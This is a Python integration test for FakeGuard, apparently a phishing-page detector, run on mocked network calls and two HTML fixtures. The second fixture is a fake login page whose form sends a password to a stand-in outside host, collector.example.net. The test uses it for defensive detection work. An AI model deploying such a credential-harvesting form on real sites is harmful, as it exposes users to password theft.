
from unittest.mock import patch

import app as fakeguard


class FixedModel:
    """Deterministic model for integration testing."""

    def __init__(self, phishing_probability):
        self.phishing_probability = phishing_probability

    def predict_proba(self, features):
        return [[
            1.0 - self.phishing_probability,
            self.phishing_probability
        ]]


def check(name, passed, details=""):
    status = "PASS" if passed else "FAIL"
    print(f"[{status}] {name}: {details}")


def run_case(name, url, html, probability):
    real_bundle = fakeguard.load_model()
    with (
        patch(
            "app.socket.gethostbyname",
            return_value="93.184.216.34"
        ),
        patch(
            "app.fetch_page",
            return_value=(url, html, 200)
        ),
        patch(
            "app.load_model",
            return_value={
                "model": FixedModel(probability),
                "feature_names": real_bundle["feature_names"],
            },
        ),
    ):

        return fakeguard.analyze(url)


print("\n=== FakeGuard Application Integration Tests ===\n")

# Test 1: A simple, ordinary webpage.
normal_html = """
<html>
<head><title>Example</title></head>
<body><h1>Welcome</h1><p>Example content.</p></body>
</html>
"""

try:
    result = run_case(
        "Normal webpage",
        "https://example.com/",
        normal_html,
        0.10,
    )

    check(
        "Normal page returns a result",
        result["status"] == 200,
        f"status={result['status']}"
    )
    check(
        "Low-risk page receives low risk label",
        result["label"] == "LOW RISK — LIKELY LEGITIMATE",
        f"label={result['label']}, score={result['score']}%"
    )
    check(
        "Result contains explanations",
        isinstance(result["reasons"], list)
        and len(result["reasons"]) > 0,
        f"reason count={len(result['reasons'])}"
    )

except Exception as exc:
    check("Normal webpage integration", False, repr(exc))


# Test 2: A controlled suspicious login-page fixture.
suspicious_html = """
<html>
<head><title>Account Login</title></head>
<body>
<h1>Login to your account</h1>
<form action="https://collector.example.net/submit" method="post">
    <input type="password" name="password">
    <button type="submit">Sign in</button>
</form>
</body>
</html>
"""

try:
    result = run_case(
        "Suspicious synthetic page",
        "https://example.com/login",
        suspicious_html,
        0.20,
    )

    check(
        "Password field identified",
        result["meta"]["password_fields"] == 1,
        f"password fields={result['meta']['password_fields']}"
    )
    check(
        "External form identified",
        result["meta"]["external_form_actions"] == 1,
        f"external forms={result['meta']['external_form_actions']}"
    )
    check(
        "Combined risk exceeds normal-page risk",
        result["score"] > 5.5,
        f"score={result['score']}%"
    )
    check(
        "Risk score stays within bounds",
        0 <= result["score"] <= 100,
        f"score={result['score']}%"
    )

except Exception as exc:
    check("Suspicious-page integration", False, repr(exc))

print("\n=== Integration tests completed ===")
